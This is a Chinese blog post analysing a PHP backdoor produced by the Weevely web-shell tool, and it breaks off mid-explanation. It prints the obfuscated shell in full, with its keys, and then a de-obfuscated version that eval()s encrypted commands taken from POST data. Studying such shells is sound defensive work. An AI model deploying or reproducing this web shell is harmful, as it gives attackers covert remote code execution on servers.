@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="关于一个木马工具的简单研究">
+<title>Weevely_wish</title>
+
+<link rel='canonical' href='https://demo.stack.jimmycai.com/p/03215d8/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Weevely_wish">
+<meta property='og:description' content="关于一个木马工具的简单研究">
+<meta property='og:url' content='https://demo.stack.jimmycai.com/p/03215d8/'>
+<meta property='og:site_name' content='Real One x86'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='TOOL' /><meta property='article:tag' content='阅读与分析' /><meta property='article:published_time' content='2024-05-10T18:53:11&#43;08:00'/><meta property='article:modified_time' content='2024-05-10T18:53:11&#43;08:00'/>
+<meta name="twitter:title" content="Weevely_wish">
+<meta name="twitter:description" content="关于一个木马工具的简单研究">
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu3198646885779591638.png" width="300"
+                            height="199" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Real One x86</a></h1>
+            <h2 class="site-description">La Vida Loca</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#if">if</a></li>
+    <li><a href="#khkf"><strong>&quot;/$kh(.+)$kf/&quot;</strong></a></li>
+    <li><a href="#file_get_contents">@file_get_contents</a></li>
+    <li><a href="#function-x">function x</a></li>
+    <li><a href="#剩下的">剩下的</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#加密obfpostpy">加密obfpost.py</a>
+      <ol>
+        <li><a href="#__init__self-url-password"><code>__init__(self, url, password)</code></a></li>
+        <li><a href="#send"><code>send()</code></a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#攻击者发给受害者">攻击者发给受害者</a></li>
+    <li><a href="#受害者发给攻击者">受害者发给攻击者</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#后门文件">后门文件</a></li>
+    <li><a href="#流量分析-1">流量分析</a></li>
+    <li><a href="#总结">总结</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/dig/" >
+                DIG
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/03215d8/">Weevely_wish</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            关于一个木马工具的简单研究
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 10, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="0">0
+</h1><p>通过weevely生成了一个php后门文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$u</span><span class="o">=</span><span class="s1">&#39;){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch(&#34;/$k8ih8i(.+)$8ik8if8i/&#34;,@file_get_contents(&#34;p8ihp://8ii8&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$v</span><span class="o">=</span><span class="s1">&#39;input&#34;),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$h</span><span class="o">=</span><span class="s1">&#39;t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i&#34;$p$kh$r$kf&#34;);}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;D&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;cDrDeDaDDte_fuDnction&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$k</span><span class="o">=</span><span class="s1">&#39;$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io=&#34;&#34;;for($i=08i;$i&lt;$l;8i){fo8ir($8ij=0;($j&lt;$c&amp;&amp;$i8i&lt;$l);8i$j+8i+,$i+8i+&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Y</span><span class="o">=</span><span class="s1">&#39;$k=&#34;88i8ic319f28&#34;;8i$kh8i=&#34;d81d1527a8i942&#34;8i;$kf=&#34;8e98ia5c2195f5&#34;8i;8i$p=&#34;ZnC8it8iZbYs8iDzbbdvRw&#34;;8ifunction 8ix($t,8i&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$A</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;8i&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$Y</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="nv">$u</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="nv">$h</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nv">$d</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$A</span><span class="p">);</span><span class="nv">$b</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+不算难理解，分解一下：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//第一部分：
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$u</span><span class="o">=</span><span class="s1">&#39;){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch(&#34;/$k8ih8i(.+)$8ik8if8i/&#34;,@file_get_contents(&#34;p8ihp://8ii8&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$v</span><span class="o">=</span><span class="s1">&#39;input&#34;),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$h</span><span class="o">=</span><span class="s1">&#39;t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i&#34;$p$kh$r$kf&#34;);}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$k</span><span class="o">=</span><span class="s1">&#39;$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io=&#34;&#34;;for($i=08i;$i&lt;$l;8i){fo8ir($8ij=0;($j&lt;$c&amp;&amp;$i8i&lt;$l);8i$j+8i+,$i+8i+&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Y</span><span class="o">=</span><span class="s1">&#39;$k=&#34;88i8ic319f28&#34;;8i$kh8i=&#34;d81d1527a8i942&#34;8i;$kf=&#34;8e98ia5c2195f5&#34;8i;8i$p=&#34;ZnC8it8iZbYs8iDzbbdvRw&#34;;8ifunction 8ix($t,8i&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$A</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;8i&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$Y</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="nv">$u</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="nv">$h</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//第二部分
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$d</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;D&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;cDrDeDaDDte_fuDnction&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nv">$d</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$A</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<br>
+<h1 id="第一部分">第一部分
+</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$k</span><span class="o">=</span><span class="s2">&#34;8c319f28&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$kh</span><span class="o">=</span><span class="s2">&#34;d81d1527a942&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$kf</span><span class="o">=</span><span class="s2">&#34;8e9a5c2195f5&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$p</span><span class="o">=</span><span class="s2">&#34;ZnCtZbYsDzbbdvRw&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">x</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$k</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$l</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$o</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$l</span><span class="p">;)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">&lt;</span> <span class="nv">$c</span> <span class="o">&amp;&amp;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$l</span><span class="p">);</span> <span class="nv">$j</span><span class="o">++</span><span class="p">,</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$o</span> <span class="o">.=</span> <span class="nv">$t</span><span class="p">{</span><span class="nv">$i</span><span class="p">}</span> <span class="o">^</span> <span class="nv">$k</span><span class="p">{</span><span class="nv">$j</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$o</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="si">$kh</span><span class="s2">(.+)</span><span class="si">$kf</span><span class="s2">/&#34;</span><span class="p">,</span><span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">),</span><span class="nv">$m</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="o">@</span><span class="nx">ob_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="o">@</span><span class="nx">gzuncompress</span><span class="p">(</span><span class="o">@</span><span class="nx">x</span><span class="p">(</span><span class="o">@</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span><span class="nv">$k</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$o</span><span class="o">=@</span><span class="nx">ob_get_contents</span><span class="p">();</span><span class="c1">//获取当前缓冲区的内容，并返回缓冲区的数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="o">@</span><span class="nx">ob_end_clean</span><span class="p">();</span><span class="c1">//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$r</span><span class="o">=@</span><span class="nx">base64_encode</span><span class="p">(</span><span class="o">@</span><span class="nx">x</span><span class="p">(</span><span class="o">@</span><span class="nx">gzcompress</span><span class="p">(</span><span class="nv">$o</span><span class="p">),</span><span class="nv">$k</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$p$kh$r$kf</span><span class="s2">&#34;</span><span class="p">);}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="if">if
+</h2><h2 id="khkf"><strong>&quot;/$kh(.+)$kf/&quot;</strong>
+</h2><ul>
+<li><code>()</code>标记一个子表达式的开始和结束位置。</li>
+<li><code>.</code>匹配除换行符之外的任何单个字符</li>
+<li><code>+</code>匹配前面的子表达式0次或者多次
+<br>
+写一个例子来理解：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$k</span> <span class="o">=</span> <span class="s1">&#39;cr&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$s</span> <span class="o">=</span> <span class="s1">&#39;ke&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;cream soda you know i like it like that &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="si">$k</span><span class="s2">(.+)</span><span class="si">$s</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">,</span> <span class="nv">$cc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$cc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*结果：
+</span></span></span><span class="line"><span class="cl"><span class="cm">array(2) {
+</span></span></span><span class="line"><span class="cl"><span class="cm">  [0] =&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cm">  string(34) &#34;cream soda you know i like it like&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">  [1] =&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cm">  string(30) &#34;eam soda you know i like it li&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">}
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<p>所以整个正则表达式的意思其实是：<i>匹配<code>$k</code>开头的<code>$s</code>结尾的，中间的任意的字符串</i>。
+<br>
+<br>
+这其中需要注意的是：<code>$cc</code> 存储了两个元素:
+<br>
+• 第一个元素<code>$cc[0]</code>，用来存储按照表达式匹配到的<strong>完整字符串</strong>，也就是***<code>cream soda you know i like it like</code><em>__，可以看到，和原字符串对比，少了结尾的_that_
+<br>
+• 第二个元素<code>$cc[1]</code>，用来存储<strong>捕获组匹配到的内容</strong>，也就是</em><code>eam soda you know i like it li</code><em>，少了开头的_cr⇒$k*，结尾的_ke⇒$s</em>
+<br></p>
+<hr>
+<h2 id="file_get_contents">@file_get_contents
+</h2><blockquote>
+<p>一个php函数，加上了@隐藏报错
+将 整个文件读入一个字符串</p>
+</blockquote>
+<p><code>php://input</code>是一个只读流， 从请求正文中读取原始数据</p>
+<p>合起来意思就是：从请求中读取内容。</p>
+<hr>
+<p>所以对于第一句条件 <code>@preg_match**(**&quot;/$kh(.+)$kf/&quot;,@file_get_contents**(**&quot;php://input&quot;**)**,$m**)**==1**)**</code> ：</p>
+<ul>
+<li>
+<p>如果在post请求中匹配到 $kh(.+)$kf ，就存入 $m 中</p>
+</li>
+<li>
+<p>然后<strong>ob_start()</strong></p>
+<p>• <strong>ob_start()</strong> 是 PHP 中的一个函数，用于开启输出缓冲。</p>
+<p>• 在 PHP 中，当输出到浏览器或者其他输出目标时，通常是立即发送给客户端的。但有时候，我们可能希望先将输出内容暂时存储起来，等待进一步处理或者在某个时机再发送给客户端，这时就可以使用输出缓冲。</p>
+<p>•<strong>ob_start()</strong> 函数的作用就是开启输出缓冲。</p>
+<p>• 一旦调用了 <strong>ob_start()</strong>，PHP 将会把后续所有的输出都缓冲起来，而不会立即发送到浏览器。</p>
+<p>• 当需要将缓冲内容发送到浏览器时，可以使用 <strong>ob_end_flush()</strong> 或者 <strong>ob_flush()</strong> 函数来完成。</p>
+<p>• 使用输出缓冲的一个常见场景是，当需要在 PHP 脚本中生成一些输出内容，但又希望在输出之前对其进行处理，比如对输出内容进行压缩、修改或者日志记录等操作时。</p>
+</li>
+</ul>
+<hr>
+<h2 id="function-x">function x
+</h2><blockquote>
+<p>AKA异或操作函数</p>
